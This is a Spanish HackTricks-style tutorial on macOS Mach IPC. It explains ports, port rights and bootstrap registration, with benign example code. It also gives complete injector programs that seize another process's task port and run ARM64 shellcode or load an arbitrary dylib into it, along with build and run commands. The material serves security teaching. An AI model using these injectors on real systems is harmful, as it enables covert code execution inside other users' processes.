# macOS IPC - Comunicación entre Procesos

{{#include ../../../../banners/hacktricks-training.md}}

## Mensajería Mach a través de Puertos

### Información Básica

Mach utiliza **tareas** como la **unidad más pequeña** para compartir recursos, y cada tarea puede contener **múltiples hilos**. Estas **tareas e hilos están mapeados 1:1 a procesos y hilos POSIX**.

La comunicación entre tareas ocurre a través de la Comunicación Inter-Procesos Mach (IPC), utilizando canales de comunicación unidireccionales. **Los mensajes se transfieren entre puertos**, que actúan como **colas de mensajes** gestionadas por el núcleo.

Cada proceso tiene una **tabla IPC**, donde es posible encontrar los **puertos mach del proceso**. El nombre de un puerto mach es en realidad un número (un puntero al objeto del núcleo).

Un proceso también puede enviar un nombre de puerto con algunos derechos **a una tarea diferente** y el núcleo hará que esta entrada en la **tabla IPC de la otra tarea** aparezca.

### Derechos de Puerto

Los derechos de puerto, que definen qué operaciones puede realizar una tarea, son clave para esta comunicación. Los posibles **derechos de puerto** son ([definiciones de aquí](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Derecho de Recepción**, que permite recibir mensajes enviados al puerto. Los puertos Mach son colas MPSC (productor múltiple, consumidor único), lo que significa que solo puede haber **un derecho de recepción para cada puerto** en todo el sistema (a diferencia de los pipes, donde múltiples procesos pueden tener descriptores de archivo para el extremo de lectura de un pipe).
- Una **tarea con el Derecho de Recepción** puede recibir mensajes y **crear Derechos de Envío**, permitiéndole enviar mensajes. Originalmente, solo la **propia tarea tiene Derecho de Recepción sobre su puerto**.
- **Derecho de Envío**, que permite enviar mensajes al puerto.
- El Derecho de Envío puede ser **clonado**, por lo que una tarea que posee un Derecho de Envío puede clonar el derecho y **otorgarlo a una tercera tarea**.
- **Derecho de Envío-una-vez**, que permite enviar un mensaje al puerto y luego desaparece.
- **Derecho de conjunto de puertos**, que denota un _conjunto de puertos_ en lugar de un solo puerto. Desencolar un mensaje de un conjunto de puertos desencola un mensaje de uno de los puertos que contiene. Los conjuntos de puertos se pueden usar para escuchar en varios puertos simultáneamente, muy parecido a `select`/`poll`/`epoll`/`kqueue` en Unix.
- **Nombre muerto**, que no es un derecho de puerto real, sino simplemente un marcador de posición. Cuando un puerto es destruido, todos los derechos de puerto existentes al puerto se convierten en nombres muertos.

**Las tareas pueden transferir derechos de ENVÍO a otras**, permitiéndoles enviar mensajes de vuelta. **Los derechos de ENVÍO también pueden ser clonados, por lo que una tarea puede duplicar y dar el derecho a una tercera tarea**. Esto, combinado con un proceso intermediario conocido como el **servidor de arranque**, permite una comunicación efectiva entre tareas.

### Puertos de Archivo

Los puertos de archivo permiten encapsular descriptores de archivo en puertos Mac (utilizando derechos de puerto Mach). Es posible crear un `fileport` a partir de un FD dado usando `fileport_makeport` y crear un FD a partir de un fileport usando `fileport_makefd`.

### Estableciendo una comunicación

#### Pasos:

Como se menciona, para establecer el canal de comunicación, el **servidor de arranque** (**launchd** en mac) está involucrado.

1. La tarea **A** inicia un **nuevo puerto**, obteniendo un **derecho de RECEPCIÓN** en el proceso.
2. La tarea **A**, siendo la titular del derecho de RECEPCIÓN, **genera un derecho de ENVÍO para el puerto**.
3. La tarea **A** establece una **conexión** con el **servidor de arranque**, proporcionando el **nombre del servicio del puerto** y el **derecho de ENVÍO** a través de un procedimiento conocido como el registro de arranque.
4. La tarea **B** interactúa con el **servidor de arranque** para ejecutar una búsqueda de arranque **para el nombre del servicio**. Si tiene éxito, el **servidor duplica el DERECHO DE ENVÍO** recibido de la Tarea A y **lo transmite a la Tarea B**.
5. Al adquirir un DERECHO DE ENVÍO, la Tarea **B** es capaz de **formular** un **mensaje** y enviarlo **a la Tarea A**.
6. Para una comunicación bidireccional, generalmente la tarea **B** genera un nuevo puerto con un **DERECHO DE RECEPCIÓN** y un **DERECHO DE ENVÍO**, y otorga el **DERECHO DE ENVÍO a la Tarea A** para que pueda enviar mensajes a la TAREA B (comunicación bidireccional).

El servidor de arranque **no puede autenticar** el nombre del servicio reclamado por una tarea. Esto significa que una **tarea** podría potencialmente **suplantar cualquier tarea del sistema**, como falsamente **reclamando un nombre de servicio de autorización** y luego aprobando cada solicitud.

Luego, Apple almacena los **nombres de los servicios proporcionados por el sistema** en archivos de configuración seguros, ubicados en directorios **protegidos por SIP**: `/System/Library/LaunchDaemons` y `/System/Library/LaunchAgents`. Junto a cada nombre de servicio, también se **almacena el binario asociado**. El servidor de arranque creará y mantendrá un **DERECHO DE RECEPCIÓN para cada uno de estos nombres de servicio**.

Para estos servicios predefinidos, el **proceso de búsqueda difiere ligeramente**. Cuando se busca un nombre de servicio, launchd inicia el servicio dinámicamente. El nuevo flujo de trabajo es el siguiente:

- La tarea **B** inicia una búsqueda de arranque **para un nombre de servicio**.
- **launchd** verifica si la tarea está en ejecución y, si no lo está, **la inicia**.
- La tarea **A** (el servicio) realiza un **check-in de arranque**. Aquí, el **servidor de arranque** crea un derecho de ENVÍO, lo retiene y **transfiere el derecho de RECEPCIÓN a la Tarea A**.
- launchd duplica el **DERECHO DE ENVÍO y lo envía a la Tarea B**.
- La tarea **B** genera un nuevo puerto con un **DERECHO DE RECEPCIÓN** y un **DERECHO DE ENVÍO**, y otorga el **DERECHO DE ENVÍO a la Tarea A** (el svc) para que pueda enviar mensajes a la TAREA B (comunicación bidireccional).

Sin embargo, este proceso solo se aplica a tareas del sistema predefinidas. Las tareas no del sistema aún operan como se describió originalmente, lo que podría permitir potencialmente la suplantación.

### Un Mensaje Mach

[Encuentra más información aquí](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

La función `mach_msg`, esencialmente una llamada al sistema, se utiliza para enviar y recibir mensajes Mach. La función requiere que el mensaje a enviar sea el argumento inicial. Este mensaje debe comenzar con una estructura `mach_msg_header_t`, seguida por el contenido real del mensaje. La estructura se define de la siguiente manera:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Los procesos que poseen un _**derecho de recepción**_ pueden recibir mensajes en un puerto Mach. Por el contrario, a los **remitentes** se les concede un _**derecho de envío**_ o un _**derecho de envío-una-vez**_. El derecho de envío-una-vez es exclusivamente para enviar un solo mensaje, después del cual se vuelve inválido.

Para lograr una **comunicación bidireccional** fácil, un proceso puede especificar un **puerto mach** en el **encabezado del mensaje** mach llamado el _puerto de respuesta_ (**`msgh_local_port`**) donde el **receptor** del mensaje puede **enviar una respuesta** a este mensaje. Las banderas de bits en **`msgh_bits`** se pueden usar para **indicar** que un **derecho de envío-una-vez** debe ser derivado y transferido para este puerto (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

> [!TIP]
> Tenga en cuenta que este tipo de comunicación bidireccional se utiliza en mensajes XPC que esperan una respuesta (`xpc_connection_send_message_with_reply` y `xpc_connection_send_message_with_reply_sync`). Pero **generalmente se crean diferentes puertos** como se explicó anteriormente para crear la comunicación bidireccional.

Los otros campos del encabezado del mensaje son:

- `msgh_size`: el tamaño de todo el paquete.
- `msgh_remote_port`: el puerto en el que se envía este mensaje.
- `msgh_voucher_port`: [vouchers mach](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: el ID de este mensaje, que es interpretado por el receptor.

> [!CAUTION]
> Tenga en cuenta que **los mensajes mach se envían a través de un \_puerto mach**\_, que es un canal de comunicación **un solo receptor**, **múltiples remitentes** integrado en el núcleo mach. **Múltiples procesos** pueden **enviar mensajes** a un puerto mach, pero en cualquier momento solo **un solo proceso puede leer** de él.

### Enumerar puertos
```bash
lsmp -p <pid>
```
Puedes instalar esta herramienta en iOS descargándola de [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Ejemplo de código

Nota cómo el **emisor** **asigna** un puerto, crea un **derecho de envío** para el nombre `org.darlinghq.example` y lo envía al **servidor de arranque** mientras el emisor solicitó el **derecho de envío** de ese nombre y lo utilizó para **enviar un mensaje**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

### Puertos Privilegiados

- **Puerto de host**: Si un proceso tiene privilegio de **Enviar** sobre este puerto, puede obtener **información** sobre el **sistema** (por ejemplo, `host_processor_info`).
- **Puerto de privilegio de host**: Un proceso con derecho de **Enviar** sobre este puerto puede realizar **acciones privilegiadas** como cargar una extensión del kernel. El **proceso necesita ser root** para obtener este permiso.
- Además, para llamar a la API **`kext_request`** es necesario tener otros derechos **`com.apple.private.kext*`** que solo se otorgan a los binarios de Apple.
- **Puerto de nombre de tarea:** Una versión no privilegiada del _puerto de tarea_. Hace referencia a la tarea, pero no permite controlarla. Lo único que parece estar disponible a través de él es `task_info()`.
- **Puerto de tarea** (también conocido como puerto del kernel)**:** Con permiso de Enviar sobre este puerto es posible controlar la tarea (leer/escribir memoria, crear hilos...).
- Llama a `mach_task_self()` para **obtener el nombre** de este puerto para la tarea que llama. Este puerto solo se **hereda** a través de **`exec()`**; una nueva tarea creada con `fork()` obtiene un nuevo puerto de tarea (como un caso especial, una tarea también obtiene un nuevo puerto de tarea después de `exec()` en un binario suid). La única forma de generar una tarea y obtener su puerto es realizar el ["baile de intercambio de puertos"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) mientras se realiza un `fork()`.
- Estas son las restricciones para acceder al puerto (de `macos_task_policy` del binario `AppleMobileFileIntegrity`):
- Si la aplicación tiene el **derecho `com.apple.security.get-task-allow`**, los procesos del **mismo usuario pueden acceder al puerto de tarea** (comúnmente agregado por Xcode para depuración). El proceso de **notarización** no lo permitirá en lanzamientos de producción.
- Las aplicaciones con el derecho **`com.apple.system-task-ports`** pueden obtener el **puerto de tarea para cualquier** proceso, excepto el kernel. En versiones anteriores se llamaba **`task_for_pid-allow`**. Esto solo se concede a aplicaciones de Apple.
- **Root puede acceder a los puertos de tarea** de aplicaciones **no** compiladas con un **runtime** **endurecido** (y no de Apple).

### Inyección de Shellcode en hilo a través del Puerto de Tarea

Puedes obtener un shellcode de:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Compila** el programa anterior y añade los **entitlements** para poder inyectar código con el mismo usuario (si no, necesitarás usar **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Inyección de Dylib en hilo a través del puerto de tarea

En macOS, **los hilos** pueden ser manipulados a través de **Mach** o utilizando **la API posix `pthread`**. El hilo que generamos en la inyección anterior fue generado utilizando la API Mach, por lo que **no es compatible con posix**.

Fue posible **inyectar un shellcode simple** para ejecutar un comando porque **no necesitaba trabajar con APIs** compatibles con posix, solo con Mach. **Inyecciones más complejas** necesitarían que el **hilo** también sea **compatible con posix**.

Por lo tanto, para **mejorar el hilo**, debería llamar a **`pthread_create_from_mach_thread`**, que **creará un pthread válido**. Luego, este nuevo pthread podría **llamar a dlopen** para **cargar un dylib** del sistema, por lo que en lugar de escribir un nuevo shellcode para realizar diferentes acciones, es posible cargar bibliotecas personalizadas.

Puedes encontrar **dylibs de ejemplo** en (por ejemplo, el que genera un registro y luego puedes escucharlo):

{{#ref}}
../../macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Secuestro de Hilo a través del puerto de Tarea <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

En esta técnica, se secuestra un hilo del proceso:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md
{{#endref}}

## XPC

### Información Básica

